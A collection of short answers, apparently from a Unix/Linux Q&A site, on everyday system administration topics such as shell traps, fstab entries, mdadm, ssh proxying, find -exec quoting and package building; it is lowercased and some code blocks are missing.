the shell will definitely not spontaneously kill its subprocesses — after all a background job is supposed to run in the background and not care about the life of its parent . ( an interactive shell will in some circumstances kill its subprocesses when it exits — which is not always desirable , hence nohup . ) you can make the shell script kill its background jobs when it exits or is killed by a catchable signal . record the process ids of the jobs , and kill them from a trap . note that this only kills the jobs ( as in , the original process that is started in the background ) , not their subprocesses . jobs=() trap '((#jobs == 0)) || kill $jobs' EXIT HUP TERM INT \u2026 subscript1 &amp; jobs+=($!) subscript2 &amp; jobs+=($!) \u2026  if you want to be sure to kill all processes and their subprocesses , more planning is in order . one method is to arrange for all the processes to have a unique file open . to kill them all , kill all the processes that have this file open . a subprocess can escape by closing the file . #!/bin/sh lock_file=$(mktemp) exec 3&lt;"$lock_file" your_script status=$? exec 3&lt;&amp;- fuser -k "$lock_file" exit $status 
i am presuming you are installing grub using the mint installer in which case i recommend you not to touch it . normally they are smart enough to know where to install themself . now , for uefi/efi the bootloader/bootmanager should get installed in the efi partition sda2 after being mounted as `boot/efi . this is consistent with what the archwiki says , through it warns that certain manufacturers could not work , in which case you will need to seek assistance .
using portage you can do this with package.env . the right place to look for the documentation is http://dev.gentoo.org/~zmedico/portage/doc/portage.html#config-bashrc-ebuild-phase-hooks . basically the way you use it is as follows . first you create ( assuming standard setup without custom ROOT ) a file in /etc/portage/env . for example , you can create a file /etc/portage/env/paxmark then for all packages you want this to apply to you add an entry to /etc/portage/package.env : #package.env example for paxmark sys-apps/gcc paxmark  this will apply the paxmark script to the package that has it specified . alternatively you can also create a /etc/portage/bashrc script for global overrides ( be very careful with that ) . a general warning though , as you can add pre and post hooks to all phases this can be dangerous . be careful with what you do as all your packages that use the hook have now become no more robust than your hook script . ( the above example for pax marking should be fine ) .
the only way i have found to do this , in regards to the filesystem change , is by working at the file level . backing up a whole partition , which just contains files , is where FSArchiver really excels . i have done a whole system with FSArchiver , but you are required to fix your bootloader and other specific configurations . you also can get FSArchiver in the systemrescuecd , or possibly in a standard package repo . working at the block level would be much simpler , i prefer partimage if the filesystem change is not a hard requirement .
some reasons i have found : historical limitation : there is no mask in the first implementation of tcpip , that means network nodes use the first number to distinguish network size and host id . moreover , since class a is determined by its first octet , the higher-order bit is 0 , so 127 . x.x. x ( 01111111 . x.x. x ) is the latest segement of class a addresses . people often use all zero or all one numbers for special usages , reserving a class a segment is for maximum flexibility . easy implementation : as what i say above , there was no mask concept in early days , segment address 01111111.00000000.00000000.00000000 is easy to be determined by and/xor operations quickly and easily . even nowadays , such pattern is still easy for matching subnets by applying xor operation . reserved for future use : class a has 1,677,216 hosts , so it allows people have more space to divide it into a lot of reasonable zones for specific usages , different devices , systems and applications . extracted from here
you can do this through the file /etc/fstab . take a look at this link . this tutorial also has good details . example steps first you need to find out the uuid of the hard drives . you can use the command blkid for this . for example : the output from the blkid command above can be used to identify the hard drive when adding entries to /etc/fstab . next you need to edit the /etc/fstab file . the lines in this file are organized as follows : UUID={YOUR-UID} {/path/to/mount/point} {file-system-type} defaults,errors=remount-ro 0 1  now edit the file : % sudo vi /etc/fstab  and add a file like this , for example : UUID=41c22818-fbad-4da6-8196-c816df0b7aa8 /disk2p2 ext3 defaults,errors=remount-ro 0 1  save the file and then reprocess the file with the mount -a command . windows partitions to mount an ntfs partition you will need to do something like this in your /etc/fstab file : /dev/sda2 /mnt/excess ntfs-3g permissions,locale=en_US.utf8 0 2 
user brian is a nginx group member , but nginx group does not have any permission on your acces log file . add brian to the adm group .
according to the desktop entry specification : field codes must not be used inside a quoted argument consequently , your %k is given literally to the bash command . changing the Exec line to the following avoids doing so : Exec=bash -c '"$(dirname "$1")"/run.sh' dummy %k  the above works locally , and also works if there is a space in the path . dummy is given to the bash script as its $0 ( what it thinks the script name is ) , and %k 's expansion is available as $1 . the nested layers of quoting are necessary to conform to the specification and be space-safe . note that %k does not necessarily expand to a local file path — it can be a vfolder uri , or empty , and a really portable script should account for those cases too . %k also is not universally supported itself , so you will need to have some constraints on the systems you expect to use it on anyway . as far as debugging goes , you can use ordinary shell redirection under kde : Exec=bash -c ... &gt; /tmp/desktop.log  this is not standardised behaviour , and it does not work under gnome and likely others . you can also give an absolute path to a script crafted to log its arguments and actions in the way you need .
how do i know if my distro of choice supports it ? it is been in the kernel since 2004 , so one way or another they all do . when you are looking around , avoid old articles which focus on redhat as they apparently had a patch for this about a year earlier .
to make changes in environment path persistent , add that lines with export to your .profile file .
the directory /etc/polkit-1/localauthority.conf.d is reserved for configuration files . you should put your file in a subdirectory of /var/lib/polkit-1/localauthority and with extension .pkla . the directory /etc/polkit-1/localauthority should be ok too , but can be modified by updagraded/installed packages , so better to avoid it .
using a cron job , you could write a file to your /tftp directory with a granularity of 1 minute . * * * * * date "+%m%d%H%M%Y.%S" &gt; /tftp/currdate.txt 2&gt;/dev/null  the contents of that file are a single value , which is formatted conveniently in the same format the date command needs to set the date/time . bash$ cat currdate.txt 102600052011.00  on the busybox side of things , you could just tftpget the file , and process it cat currdate.txt | while read date; do date $date done  if http is an option , you could set up a php script that just returned the date when called , and have your script on the busybox side poll that url , and process the result . the granularity of the date would be closer , in that case . with tftp , you will be within 1 minute . hopefully that is close enough .
gnome is a ewmh/netwm compatible x window manager . you should use wmctrl to interact with the windows that works very well . wmctrl -r part-of-title-string -e 0,100,200,300,400  sets a window with " part-of-title-string " in the title to width 300 , height 400 at position 100,200 ( the 0 is for default gravity ) . wmctrl -r part-of-title-string -b add,above  makes sure that window is always on top .
ctrl w is the standard " kill word " ( aka werase ) . ctrl u kills the whole line ( kill ) . you can change them with stty . note that one does not have to put the actual control character on the line , stty understands putting ^ and then the character you would hit with control . after doing this , if i hit ctrl p it will erase a word from the line . and if i hit ctrl a , it will erase the whole line .
i am answering to my own question now because i finally found a workaround for this problem . i found out that it is possible to reorder the devices by unloading the drivers and then loading them in correct order . first method ( bruteforce ) : so the first method i came up with was simple to bruteforce the driver reload with init . d script . following init script is tailored for debian 6.0 but the same principle should work on almost any distribution using proper init . d scripts . then the script must be added to proper runlevel directory . this can be done easily on debian with " update-rc . d " command . for example : update-rc.d reorder-nics start S second method ( better i think ) : i also found a bit more elegant way ( at least for debian and ubuntu systems ) . first make sure that kernel doesnt automatically load the nic drivers . this can be done by creating a blacklist file in /etc/modprobe.d/ . i created a file named " disable-nics.conf" . note that files in /etc/modprobe.d/ must have .conf suffix . also naming modules in /etc/modprobe.d/blacklist.conf do not affect autoloading of modules by the kernel so you have to make your own file . then run ' depmod -ae ' as root recreate your initrd with ' update-initramfs -u ' and finally add the driver names in corrected order into /etc/modules file . changes should come in effect after the next boot . reboot is not necessary though , it is easy to switch the devices with following command ( as root ofcourse ) : modprobe -r driver_0; modprobe -r driver_1; modprobe driver_1; modprobe driver_0  some usefull links i found while searching the solution : http://www.macfreek.nl/mindmaster/logical_interface_names http://wiki.debian.org/kernelmoduleblacklisting http://www.science.uva.nl/research/air/wiki/logicalinterfacenames
rather than re-package the existing rpm , inspired by hp i packaged it in an additional rpm . the new rpm is very simple in that it just has the single patch-rpm inside it , and invokes the rpm command to install it .
the xen-kernel is not the main problem here . you need to bring the hyper-v-disk-module into the initrd . after that you need to remove all references to xvda ( or the like ) and replace them with sda ( or the like ) within the bootloader , grub and /etc/fstab of the " old " domu . with kernels newer than 2.6.32 this is a peace of cake - since linux mainstream contains these modules . prior to that you have to compile these modules for your kernel . here is a good starting point in microsoft technet about that topic .
the script expects an argument when it is executed . this argument is the directory where *.apk resides . the argument is called in the script by cd $1 line , this is how arguments are called in shell scripting . please try to rerun your script in the following manner : sh cert.sh &lt;/path/where/apks/reside&gt; and see if that resolves your issue ? also , before for loop add rm -rf other and rm -rf none lines to remove the errors relating to existing folders .
i ended up using some ssh ~/.ssh/config hacks to make this happen : what this does is that when i attempt to connect to ssh overthere from sittinghere , it connects to hopper and then proxies the ssh connection to port 22 on overthere ( ie : ssh on overthere ) . this has some awesome side-effects : ssh -L 5900:localhost:5900 overthere "x11vnc -display :0 -localhost"  everything works awesome and as far as i can tell , 5900 is not opened on hopper , only forwarded directly from overthere to sittinghere .
the apt history is usually kept in /var/log/apt . you should be able to view the most recent log with : less /var/log/apt/history.log  older log files may be compressed , so you may need : zless /var/log/apt/history.log.1.gz  also see the term.log files for the output that was on the terminal .
oh yes , you can ! open your ~/.bash_aliases file and type the following to the end of the file ( create a new ~/.bash_aliases if it does not exist ) : alias mycp='cp ~/.bashrc ~/Dropnot/level1/setups/bash1'  this will create an alias mycp ( you can give a different name for mycp ) which will copy your ~/.bashrc file to the desired location . you could create a shell variable which contains the long path and then use the variable in place of the long path . for example , in your ~/.bashrc: export fav_path=/usr/share/help/nl/gnome-help/figures/  and source ~/.bashrc and then use cp ~/.bashrc "$fav_path"  remember to use the " for paths containing spaces .
yes it is possible - in a manner of speaking , just for raid1 . change it to one drive . mdadm --grow /dev/md5 --raid-devices=1 --force  it should then show up as being in a good state : md0 : active raid1 sdx1[42] 12345678 blocks super 1.2 [1/1] [U]  with this there is no longer a missing drive and mdadm should no longer complain about it being degraded . when you are ready to add your second drive later , just grow it again : mdadm --grow /dev/md5 --raid-devices=2 --force mdadm --manage /dev/md5 --add /dev/sdy1  i use this to make a bootable mirror of my single ssd to hdd from time to time .
try : fidsk -l | grep -o '^/dev/sdb[0-9]'  the -o option causes grep to print only matching pattern . updated if you want all except /dev/sdaX , you can use : fidsk -l | grep -o '^/dev/sd[b-z][0-9]' 
wrapping this up into a script to do it in a loop would not be hard . beware that if you try to calculate the number of iterations based on the duration output from an ffprobe call that this is estimated from the average bit rate at the start of the clip and the clip 's file size . ffprobe does not scan the entire file for speed reasons , so it can be quite inaccurate . another thing to be aware of is that the position of the -ss option on the command line matters . where i have it now is slow but accurate . the first version of this answer gave the fast but inaccurate alternative . the linked article also describes a mostly-fast-but-still-accurate alternative , which you pay for with a bit of complexity . all that aside , i do not think you really want to be cutting at exactly 10 minutes for each clip . that will put cuts right in the middle of sentences , even words . i think you should be using a video editor or player to find natural cut points just shy of 10 minutes apart . assuming your file is in a format that youtube can accept directly , you do not have to reencode to get segments . just pass the natural cut point offsets to ffmpeg , telling it to pass the encoded a/v through untouched by using the " copy " codec : the start point for every command after the first is the previous command 's start point plus the previous command 's duration .
use gsub : a="YYYY-MM-DD" b=a gsub("-", "", b) print(b)  will output : YYYYMMDD  gsub replaces the first argument with the second in the third , in-place , so we copy the value of a into b first . we replace the - characters with nothing .
if you have ubuntu in a virtualbox vm , you can install the guest additions as an ubuntu package . either grab virtualbox-guest-additions or virtualbox-ose-guest-utils and virtualbox-ose-guest-x11 . the ose guest utilities are compatible with the proprietary vm and vice versa ( at least with respect to common features such as file sharing and pointer grabbing ) .
while i am not familiar with every feature of bash , i do not believe this is a built-in feature of the bash shell . i was unable to find this feature in the relevant sections of the bash manual . you may be able to cobble something together using trap . from help trap: trap signals and other events . defines and activates handlers to be run when the shell receives signals or other conditions . thus by using the command : $ trap my_function ERR  i can ensure that my_function is called whenever a command fails . my_function could be a function that parses the previous command , looking for known extensions and calling the appropriate command based on that extension . depending on your interest , writing such a function may be more or less interesting than moving to the z shell .
to the first point : usb1.1 was a lot slower than usb2.0 , in most cirumstances . note that devices can still connect at the lower 1.1 speed of 12mbps instead of the faster 480mbps , but usually when this occurs it is either because the port is autonegotiating low or it is because one of the two devices is really 1.1 . try disconnecting and reconnecting if you experience this and are sure both are 2.0 and your os has support for 2.0 . ( general advice , ya ? ) ~~ anyways , that was why they recommended a new card . so that you could use the full usb1.1 speed per individual camera since the pci bus is way faster than usb1.1 . but with 2.0 that is not necessary . [ dead horse flogged , going on to next topic ] now onto your device specifically . you have a core i5 by most ostensible metrics , namely : intel 5 / 3400 series pch and 82801 pci bridge . ( side note : confirmed that he has a dell core i5 ) this particular pch is also code-named ibex peak . you no longer have an independent southbridge ( as it is my understanding ) so you are possibly open to new behavior that did not exist before . the integrated chipset now handles the usb much closer to the dma , so i expect that the issue is either with the 5/3400 chipset or that the issue is with the driver . either are easy to test , but they do require an initial capital outlay , so that sucks . here 's my reasoning why i think it is the chipset and not the cameras or drivers : there are known issues with the intel pch ( i am going to quote now to save back and forth clicking : usb ports hang with bulk and control traffic ( erratum 7 and microsoft kb9820911 ) bogus usb ports will be detected at desktop pch equipped with 6 usb ports ( 3420 , h55 ) on the first ehci controller . this can happen when ac power is removed after entering acpi s4 . adding ac power back and resuming from s4 may result in non detected or even non functioning usb device ( erratum 12 ) bogus usb ports will be detected at mobile pch equipped with 6 usb ports ( hm55 ) on the first ehci controller . this can happen when ac power and battery are removed after entering acpi s4 . adding ac power or battery back and resuming from s4 may result in non detected or even non functioning usb device ( erratum 13 ) this leads me to believe that adding a new pci card will improve performance by removing load on the particular usb controller logic , but as a test try moving both the camera 's to the same usb hub ( matching stacked slots on the motherboard should be sufficient ) and see if they exhibit the same problem . dollars to pesos says that you will have the exact same issue when you do this . however , i think it is more likely an issue with uvc drivers on linux in general with multiple cameras handled by the same controller ( as yours is ) , and not something specific to the hardware . i just thought i would start with the hardware first to address that particular bit ( since it is entirely possible it could be at fault ) . here 's a string of related urls : http://answerpot.com/showthread.php?1074387-running+multiple+webcams+on+the+same+hub http://www.mail-archive.com/linux-uvc-devel@lists.berlios.de/msg05235.html http://sourceforge.net/projects/mjpg-streamer/forums/forum/739917/topic/2042468 ( actually something else to consider ) http://www.lavrsen.dk/foswiki/bin/view/motion/supportquestion2009x04x30x053208 ( old ) http://www.lavrsen.dk/foswiki/bin/view/motion/supportquestion2009x08x04x191406 ( similar problem , new pci usb ) http://lists.berlios.de/pipermail/linux-uvc-devel/2009-may/004806.html ( direction for searching ) http://www.lavrsen.dk/foswiki/bin/view/motion/supportquestion2009x05x28x183617 ( from motion , but older ) ok , that is enough rambling for now . reply comments ? tl ; dr : get a usb pci card and put one camera on there .
i have to use two dashes for this parameter , like $ ps --ppid 1  my version : $ ps --version procps-ng version 3.3.4 
you can have ssh return the output of any remote command simply by sending the command as the last argument to your ssh comand : ssh user@host 'ls /path/to/dir'  if you have key based authentication setup this can be done without entering a password . however parsing the output of ls is always a bad idea , and it sounds like you might have a use case for something a little fancier . there is a file system called sshfs that allows you to mount virtually any file system that you can ssh into . you could mount the remote directory so that your php script could operate on it as if it was a set of local files and directories .
newgrp starts a subshell with the group you specified . so that line in your script will not finish until that subshell is done . the handling of newgrp is also different if you are using bash or ksh . ksh implements it as a built-in command that is equivalent to exec /usr/bin/newgrp [group] . so , like exec , newgrp never returns . ( see some documentation here . ) if you want it to return , and want to execute commands in that subshell with changed group identity , you can use redirection . for example : #!/bin/ksh echo "Before newgrp" /usr/bin/newgrp users &lt;&lt;EONG echo "hello from within newgrp" id EONG echo "After newgrp"  notice : /usr/bin/newgrp is called explicitly to avoid the implicit exec from ksh . the last command in that script will run within the original shell , with the original group identity .
as with most things in arch , there is not a default time management tool set up ; you can choose between several time synchronisation options . give the raspberrypi 's lack of a rtc , i would suggest that you ensure that you use a tool that can store the last time to disk and then references that at boot time to pull the clock out of the dawn of unix time . using a combination of systemd-timesyncd , with an optional configuration file for your preferred time servers in /etc/systemd/timesyncd.conf , and systemd-networkd will bring your network up swiftly at boot and correct any drift in your clock as early as practicably possible . the daemon will then sync your clock at periodic intervals ( around every 30 minutes ) .
try xpra . this is similar to ssh -x , except it is faster and you can disconnect and re-connect to the session as many times as you like .
as i understand it , you want to see the files , if any , hidden by the mount /dev/sda1 /tmp/somefolder command . assuming that /tmp is part of the / filesystem , run : mount --bind / /tmp/anotherfolder ls /tmp/anotherfolder/tmp/somefolder  if /tmp is not part of / but is a separate filesystem , run : mount --bind /tmp /tmp/anotherfolder ls /tmp/anotherfolder/somefolder 
http://pubs.opengroup.org/onlinepubs/009604599/functions/gettimeofday.html does indeed say it was added in 2001 .
it is not grep changing the output . it is dpkg and aptitude . they check whether the output goes to a terminal or to some other command . if it is a terminal they adapt their own output width to match the terminal size . if the output does not go to a terminal , the command has no idea what column size would be appropriate . ( the output might as well end in some file . ) the same happens with ls . compare ls and ls|cat . there is no general way to solve this , but some commands might have specific options for that . for example aptitude has --disable-columns and -w: the man page of dpkg says :  COLUMNS Sets the number of columns dpkg should use when displaying formatted text. Currently only used by -l. 
the point was that the mac us keymap ( setxkbmap -layout us -variant mac ) had some keys at the wrong spot . i edited /usr/share/X11/xkb/symbols/us , where it seemed that the TLDE and LSGT key are switched in the mac section . loading setxkbmap -layout us -variant mac does the trick now .
you can either use the -C option to change into the /home/user directory before tarring , or --skip-components 2 on extraction . tar cvfC /var/lib/backup/sample.tar /home/user .project # Note the space ^  tar cvf /var/lib/backup/sample.tar /home/user/.project tar Cxf /backup /var/lib/backup/sample.tar --strip-components 2 
here 's a hacked together script that will do what you want . to display the resulting file , 4v.html: $ xdg-open 4v.html  and the final product : &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; adjustments if you want to use a different series of .png images merely change the arguments to the for loop . for i in {1..4}.png;do echo "&lt;img src="$i"&gt;"; done  the files are named 1.png , 2.png , 3.png , and 4.png in my example . so if they were all in a directory by themselves you could do this instead : for i in *.png;do echo "&lt;img src="$i"&gt;"; done 
you can use different versions of the svn client ( tortoisesvn ) and the svn server ( ubersvn ) together . this is also the case with just plain subversion as well . so your client can be at a higher or lower version number than your server , and vice versa . you can read more about the " inter-compability " between versions here in the subversion documentation . the version numbers help to distinguish between bug fixes and api changes . typically when the major . minor numbers of a given subversion version change it is telling you the type of change that occurred . for bug and security fixes the minor number will change . for more drastic changes to the api or new features , the major number will change . these changes typically do not impact the core functionality , so you can still use subversion client version 1.5 with server version 1.7 , for example . in most cases the client will simply ignore any extra information that a particular feature may offer , if the server is at a higher version number .
long before there were computers , there were teleprinters ( aka teletypewriters , aka teletypes ) . think of them as roughly the same technology as a telegraph , but with some type of keyboard and some type of printer attached to them . because teletypes already existed when computers were first being built , and because computers at the time were room-sized , teletypes became a convenient user interface to the first computers - type in a command , hit the send button , wait for a while , and the output of the command is printed to a sheet of paper in front of you . software flow control originated around this era - if the printer could not print as fast as the teletype was receiving data , for instance , the teletype could send an xoff flow control command ( ctrl-s ) to the remote side saying " stop transmitting for now " , and then could send the xon flow control command ( ctrl-q ) to the remote side saying " i have caught up , please continue " . and this usage survives on in unix because modern terminal emulators are emulating physical terminals ( like the vt100 ) which themselves were ( in some ways ) emulating teletypes .
i much enjoy using mupdf . there is no visible ui and the default keybindings are fine .
this is a problem with oxygen-gtk theme . change it to oxygen-molecule .
try nmblookup &lt;wins-hostname&gt; .
there is a dropbox command line tool that allows you to perform all sorts of tasks , including stopping and starting dropbox . you could include a short snippet in your .profile or .bash_profile ( depending on what you use ) , that checks if dropbox is already running , and if not , starts it : ~/bin/dropbox.py running [ $? -eq 0 ] && ~/bin/dropbox.py start
two options come to my mind : own the directory you want by using chown: sudo chown your_username directory  ( replace your_username with your username and directory with the directory you want . ) the other thing you can do is work as root as long as you know what you are doing . to use root do : sudo -s  and then you can do anything without having to type sudo before every command .
is strongly not recommended using ppa 's on others debian-based system since those packages where meant for ubuntu-only distributions . that said there are different ways you can update your packages . 1 . backport you can backport your package as said sr_ with the provided instructions . 2 . using unstable repositories this was already explained here . 3 . build from debian source you can get the most recent driver from the debian package page and build it yourself ( you can search the source using http://packages.debian.org/src:package_name ) . just download the . dsc , orig . tar . gz , and diff . gz ( the package can not include last one ) in a single directory and execute dpkg-source -x package_version-revision.dsc . it will build a nice . deb file that you can install using dpkg -i . be sure that you have all the build dependencies using apt-get build-dep package_name and your source repositories activated in the sources.list file . 4 . building from debian-git using the same package list as above , look for the " debian package source repository " section , and clone the repository ( you must know how to use git ) . enter in the just created directory and run dpkg-buildpackage -us -uc -nc , you can also modify the source and apply patchs . in the parent directory there will be your recently created . deb packages . 5 . building from the upstream this is more complex to archive since each piece of software has it is own way of building/installing but in most cases involve : you must consult the documentation in those cases . you can debianize this packages too using dh_make .
the backticked expression : echo {} | tr mkv m4v ( which is not what you want , for a variety of reasons ; see below ) is expanded once , when the find command is parsed . if you are using bash , it will normally be expanded to {}: $ echo {} | tr mkv m4v {}  and , indeed , that happens on every shell installed on my machine except fish , which outputs an empty line . assuming you are not using fish , then the arguments find is actually seeing will be : find -name '*.mkv' -exec HandBrakeCLI -Z "Android Tablet" \ -c "1-3" -m -O --x264-tune film -E copy --decomb -s 1 -i {} \ -o {} \;  in short , HandBrakeCLI is being given the same file for both input and output , and i think that is what you are seeing , although your description of the symptoms is not very precise . unfortunately , there is no easy way to get find to do the extension replacement you want it to do within an -exec action . you could do it by passing the command to bash -c , but that will involve extra , confusing quoting on the command line . a cleaner and more readable solution is to create a shell script file which can iterate through it is arguments : file : mkvtom4v.sh ( make sure you chmod a+x mkvtom4v.sh ) and then invoke it with find : find /path/to/directory -name '*.mkv' -exec /path/to/mkvtom4v.sh {} +  some notes : do not use backticks ( <code> some command </code> ) ; they have been deprecated for many years . use $(some command) , which is more readable and allows nesting . tr is definitely not what you want . it does character by character translation . for example , tr aeiou AEIOU would make all vowels uppercase . tr mkv m4v will change every k to a 4 . see man tr ( or info tr ) for more details . "${file/%.mkv/.m4v}" is bash 's idiosyncratic search-and-replace syntax . in this case , it means : " take the value of $file , and if it ends with .mkv ( the % means " ends with " in this context ) , then replace it with .m4v" . there are lots of other bashisms for editing the value of a variable . man bash and search for " parameter expansion " . with gnu find , you can use {} + at the end of an -exec command ( instead of \; ) . it will be replaced by as many found filenames as possible . see info find for more details .
i decided to create another related question how to keep bash running after command execution ? to just forget about big picture and focus on the main problem . worked as intended and finally there were presented 3 ways to achieve the goal : workaround which was not bad portable ( posix ) simple and i choose to use 3rd one that way : ~/ . run_screen : #!/bin/bash /bin/bash -i &lt;&lt;&lt;"$*; exec &lt;/dev/tty"  ~/ . screenrc :
any reason why in the https section you send everything under /blog/admin to fastcgi ? why not make a rule specific to * . php like you have in the http section ? in other words , under http you have : but under https , you have : i think if you change /blog/admin to ~ /blog/admin/ . *\ . php$ your problem would be solved . . .
try with : awk '/foo/||/bar/' Input.txt 
you can use vmware converter to convert the partition to a vm . after that , you would still need to remove the kali partition and extend your windows partition . if windows does not see the windows partition , try qtparted from a knoppix livecd . when the partition is removed , you should be able to extend your windows partition . i have done this several times , and i do not think extending a windows partition has big risks associated with it . if you want to be really sure , take a backup first .
if (( RANDOM % 2 )); then C1; else C2; fi 
if you have bash 4 , consider using globstar instead . it gives you recursive globbing . this solution will work across files with crazy characters in their names and avoids a subshell . but if bash 4 is not an option , you can recreate this solution using find -exec +: however , this is subject to your system 's arg_max ( unlike the above ) , so if the number of files is very large you could still end up with multiple runs over subsets of the files .
assuming your script is running with a controlling terminal ( so that the output has somewhere to go to be seen ) you just need to add one line : /bin/mail -s "$SUBJECT" "$EMAIL" &lt; $emailmessage cat $emailmessage 
since you mention perl . . . invoke this as /path/to/my/script file_with_patterns  replace the . at the end with the top of the tree you want to walk .
you can do this easily using the source command to import the contents of another file into the current shell environment ( in your case your script ) and run it there . in db.conf: username="username" password="password" database="database"  in your script : notes : you should never put a space after the = assignment operator when assigning shell variables ! i did a couple things to cleanup your code . i did not add the new dump to a single tar file like you were doing . i did show how you can compress an individual file . if you wanted to tar it so they were all in one archive you can do that too , but i find having individual compressed dump files quite useful . i moved the cd operation to before the mysqldump command so that you would not have to specify the path for the output file since that is the current directory . just saves duplicated code . edit : even with that step done , it seems like this is a half-baked solution to me . you might be interested in how you can pass values using arguments . for example you could take the hard coded path to the config file out of the script above and replace it with this : #!/bin/sh source "$1" cd /home/sh [...] # rest of script as above  you could then execute it like ./mysqlbackup.sh /path/to/db.conf . you could even take this a step farther and just write it all in one script and provide all three values as arguments : #!/bin/sh username="$1" password="$2" database="$3" cd /home/sh [...] # rest of script as above  . . . and call it like ./mysqlbackup.sh username password database .
there is no good , portable method to sort files by their time . the most portable methods are : if you can assume that file names contain only printable characters , call ls -ltd . otherwise , use perl . this is the classical method to sort files by date with gnu tools . you are assuming that the file names contain no newline ; this is easily fixed by changing \\n to \0 and calling sort with the -z option . oh , and drop the roundabout sed calls ; note that your script will not work if $idir contains any of #*^$\[ because sed will interpret them as special characters . cd "$idir" &amp;&amp; find -mindepth 3 -maxdepth 3 -type d -printf '%T@ %Tc\t\t%p\0' | sort -hz | tr '\0\\n' '\\n\0' | sed 's/^[^ ]* //'  by the way , you are sorting files by their modification time , not by their creation time . most unix variants other than osx do not support creation times all the way through ( from the filesystem through the kernel to userland tools ) . the easy , clean way to sort files by their modification time is to use zsh . the glob qualifier om sorts files in increasing age ( use Om to get the oldest file first ) . files=(*(om)) echo "The oldest file is $files[-1]"  to get some output like what you show , you can use zstat . zmodload zsh/stat describe () { typeset -A st zstat -s -H st "$REPLY" echo "$st[mtime] $REPLY" } : */*/*(/+describe) 
MonoServerPath example.com "/usr/bin/mod-mono-server4"  should probably be MonoServerPath mydomain.org "/usr/bin/mod-mono-server4" 
at last , after almost six weeks of frustrated , numerous , attempted solutions based on suggestions by kind friends and internet question sites , i have solved the problem ( i think -- i am cautiously optimistic ) . the underlying symptom was that yum install emacs failed with a long list of errors , . now it has finally worked , without hesitation . i do not know why , finding out is my next quest . this is what i followed : http://qandasys.info/fedora-19-unable-to-update-or-install-could-not-resolve-host/ answer by stramash november 4 , 2013 at 2:24 pm resolved this by adding nameserver 8.8.8.8 above my router’s address in resolv . conf that was obtained by dhcp . not quite sure why it will not work with the automatic dhcp settings . thanks .
the two commands are not related in any way . dpkg --get-selections returns the selection state of available packages . from man dpkg: the selection state is one of : /proc/modules , on the other hand , is the list of available kernel modules ( you can consider these as equivalent to dll files in the windows world ) . while some modules will have been installed as packages , others are included in the kernel . so , looking at the list of modules , you will see some overlap with the dpkg command above if you have installed certain modules that are not part of the kernel . for example , on my system , i have installed the fuse package which provides the fuse kernel module . i therefore have an entry for fuse in both lists : $ dpkg --get-selections | grep -P 'fuse\t' fuse install $ grep 'fuse' /proc/modules fuse 67503 3 - Live 0xffffffffa1140000  conversely , the package firefox does not provide any modules so it is only listed in the dpkg output : $ dpkg --get-selections | grep -P 'firefox\t' firefox install $ grep 'firefox' /proc/modules $ 
if you enable mod_status and turn on ExtendedStatus , it will display the request being handled by each worker .
currently , debian testing is in a freeze state . this means that new uploads must be approved by the release team , and generally must fix rc ( release critical ) bugs . it is very rare for the release team to accept new upstream releases ( rather than patches specifically for rc bugs ) after the freeze . so the answer to this question is after the following has occurred : the mono team packages and uploads mono 3.0 to unstable wheezy is released as stable and jesse becomes the new testing 2-10 days have passed since the upload to unstable ( depending on urgency set on the package ) . in addition to this , if a rc bug is filed against the unstable package before it migrates to testing , the rc bug will bock migration . the severity of the bug will need to be downgraded , or a new version of the package which fixes the rc bug will need to be uploaded . outside of a time in which testing is frozen , the answer to your question is "2-10 days after the maintainer or team has time to do the work and upload to unstable " . maintainers or teams own packages in debian , and they are all volunteers , so it is really dependent on the individuals involved . unfortunately , i do not know of any direct sources where this process is clearly laid out . i have this knowledge from years of working with os and lurking around the development community .
that is the default cursor . you can run :  xsetroot -cursor_name left_ptr  to set the pointer to the left arrow . typically , this goes in your . xinitrc file .
dhcpd or not ? you do not say but i am assuming that you have some pxe configuration file that this dev board is setup to look for . typically you had tell the dhcp clients what pxe image to use like so via a dchp server : the tftp server would be the next-server 192.168.0.100 , and the file to load would be filename "pxelinux.0" . but since you do not have this setup your dev board is looking for a the " next-server " at a specific ip address , i am going to assume that it is looking for a specific pxe file too . using pxelinux this solution would assume you have control over pointing the dev board at a particular " filename " , in this case i am suggesting you use pxelinux , the file would be pxelinux.0 . pxelinux allows you to have custom images based on a system 's mac address is the more typical way to do it , since system generally do not have an actual ip address assigned to them in a static way , whereas the mac addresses are static . setup on the tftp server 's root directory you had then create something like this : /mybootdir/pxelinux.cfg/01-88-99-aa-bb-cc-dd /mybootdir/pxelinux.cfg/01-88-99-00-11-22-33 /mybootdir/pxelinux.cfg/default  each mac address above is a file with the appropriate boot stanza in it for each system . here 's mine from my cobbler setup : along with a sample file : the above can be paired down to suit your needs , but should be enough of an example to get you started , there additional examples up on the pxelinux website as well !
i do not know from where you got those links/hosts , but they are dead . try to replace them with the ones included in the download via update site section : add one of the following update sites to your exlipse update configuration ( menu : help-> software updates-> find and install ) http://emonic.sourceforge.net/updatesite/internap/site.xml san jose , ca - north america http://emonic.sourceforge.net/updatesite/nchc/site.xml tainan , taiwan - asia http://emonic.sourceforge.net/updatesite/ovh/site.xml paris , france - europe i tested those , and the work just fine . found the issue , those xml files include links to 3rd parties sites which were sourceforge mirrors some time . apparently , the only way to go is using the other way and manually downloading the packages and placing them into the proper directories . http://sourceforge.net/projects/emonic/files/emonic/0.4.0/emonic_0.4.0.zip/download just unzip the file into your eclipse installation directory ( /usr/share/eclipse/dropins ) and things should be fine .
the child-parent relationship gets ruined by all the ' and ' involved . the wait(2) system call , which the wait builtin is apparently based on , will only work for a direct child pid of the process that calls wait(2) . when you invoke sh myprogram &amp; , you run sh as a child of the interactive shell . when you invoke sh notify &amp; , that sh is a child of the interactive shell . so the second sh has no direct parent relationship with the first sh , and wait will not work . this will not even work if you invoke sh myprogram &amp;; sh notify; either , because the wait command is invoked by a child of the interactive shell . what does work for me is this : sh myprogram &amp;; wait the wait command causes the interactive shell ( parent of the sh invoked explicitly ) to hang around until the sh exits .
you can configure this in either ~/.Xresources: xscreensaver.mode: blank  or ~/.xscreensaver: mode: blank  to verify : xrdb -load ~/.Xresources killall xscreensaver xscreensaver -no-splash &amp;  then press ctrl - alt - l , and stare into the unblinking eye of infinity .
chromium can also use the mozilla plugins . just install it and it should work . what distro are you using ?
